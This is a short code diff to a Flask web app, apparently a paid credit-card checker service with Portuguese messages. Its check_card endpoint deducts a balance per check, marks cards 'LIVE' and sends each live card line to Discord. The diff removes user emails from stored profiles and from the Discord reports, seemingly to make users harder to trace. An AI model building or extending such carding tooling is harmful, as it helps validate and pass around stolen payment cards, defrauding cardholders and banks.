@@ -87,7 +87,7 @@ def register():
         if response.user:
             profiles = supabase.table('profiles').select('*').eq('id', response.user.id).execute()
             if not profiles.data:
-                supabase.table('profiles').insert({"id": response.user.id, "balance": 0.0, "email": email}).execute()
+                supabase.table('profiles').insert({"id": response.user.id, "balance": 0.0}).execute()
         return jsonify({"success": True, "message": "Registro realizado com sucesso"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 400
@@ -235,7 +235,7 @@ def check_card():
     user_id = session['user_id']
     
     try:
-        profile = supabase.table('profiles').select('balance, email').eq('id', user_id).execute().data[0]
+        profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
         balance = float(profile['balance'])
         
         if balance < 1.0:
@@ -247,7 +247,7 @@ def check_card():
         if result == "LIVE":
             new_balance = balance - 1.0
             supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
-            send_to_discord(card_line, profile.get('email', 'Desconhecido'))
+            send_to_discord(card_line, "Usuário Logado")
             
         return jsonify({"success": True, "status": result})
         
